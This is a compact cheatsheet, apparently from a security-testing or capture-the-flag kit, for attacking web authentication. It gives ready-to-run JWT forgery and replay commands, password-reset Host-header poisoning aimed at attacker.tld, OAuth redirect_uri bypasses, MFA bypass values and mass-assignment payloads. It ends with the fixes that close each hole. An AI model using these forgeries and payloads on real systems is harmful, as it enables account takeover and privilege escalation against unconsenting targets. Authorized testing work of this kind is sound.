# Cheatsheet — the 60-second reference

The whole skill on one card. Open the named file when a section isn't
enough.

---

## 1. Identify the token

```bash
python3 tools/web/session_dissect.py --token "$T" --challenge "$C"
```

`aaa.bbb.ccc` → JWT · `data.sig` → itsdangerous · `gAAA` → Fernet ·
hex → opaque · `s%3A<jwt>.<sig>` → express.

## 2. JWT attacks (priority order)

```bash
# alg=none
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --alg ''
# weak secret
python3 tools/web/session_dissect.py --token "$T" --try-keys --wordlist secrets.txt
# RS→HS
python3 tools/web/jwt_forge.py --token "$T" --claims '{"role":"admin"}' --pubkey pubkey.pem
# kid / jku
python3 tools/web/jwt_forge.py --token "$T" --kid ../../../../dev/null --kid-secret ''
python3 tools/web/jwt_forge.py --token "$T" --jku "https://you/jwks.json"
# replay
python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
  --url "$BASE/admin" --header "Authorization: Bearer $FORGED" \
  --evidence-regex '"role"\s*:\s*"admin"' --evidence-kind impact \
  --on-match confirms --on-miss refutes
```

## 3. Session (opaque) attacks

- fixation: plant `sid=X` before login → login → replay `X` (`session-fixation.md`)
- predict: sequential/timestamp/user-hash → `id_sweep` (`session-analysis.md`)
- steal: `Referer`, missing `Secure`/`HttpOnly`, `Domain` too broad (`cookie-flags.md`)

## 4. Reset flow

```
Host: attacker.tld    X-Forwarded-Host: attacker.tld
{token: YOURS, email: VICTIM}       # unbound token
{email: [victim, attacker]}         # param pollution
```

## 5. MFA

`code` absent → `""` → `null` → `0` → `"000000"` → race (`race_probe`)
→ TOTP seed in QR/`otpauth://` (`mfa-bypass.md`)

## 6. OAuth

- `redirect_uri` bypasses: `attacker.tld`, `target.tld.attacker.tld`,
  `target.tld@attacker.tld`, `%2f`, `//host`, `?next=` chain
- `state` missing → login CSRF (`oauth-flow-issues.md §3`)
- `response_type=token` → implicit leak; `id_token` unsigned
- `/token` — `code` bound to wrong `client_id`

## 7. Registration / update

- `{"role":"admin"}`, `{"isAdmin":true}`, `{"balance":99999}`, `{"id":1}`
- `__proto__` / `constructor.prototype` on JSON-input surfaces
- `PUT /user/2`, `{"email":"victim"}`, `?_switch_user=admin`

## 8. Cookie-flag triage

```
Secure    missing → http readable
HttpOnly  missing → XSS readable
SameSite  None/Lax → CSRF classes
Domain    too broad → subdomain read/plant
Path      too narrow → logout leaves a copy
__Host-   required attrs absent → rejected, or subdomain can't overwrite
```

## 9. The three verdicts

- surface — token set, 200 login — `inconclusive`
- class — mechanism broken (alg=none accepted, sid not rotated) — `confirms`
- impact — boundary crossed (`/admin` with forged token) — `confirms`

## 10. Stop conditions

- JWT: alg pinned + strong key + no header injection + revocation
- Session: rotate-on-login + server-side store + `__Host-` strict attrs
- Reset: single-use + bound + expiry + Host ignored
- MFA: seeded TOTP + rate limit + bound code
- OAuth: strict `redirect_uri` + bound `state` + verified `id_token`
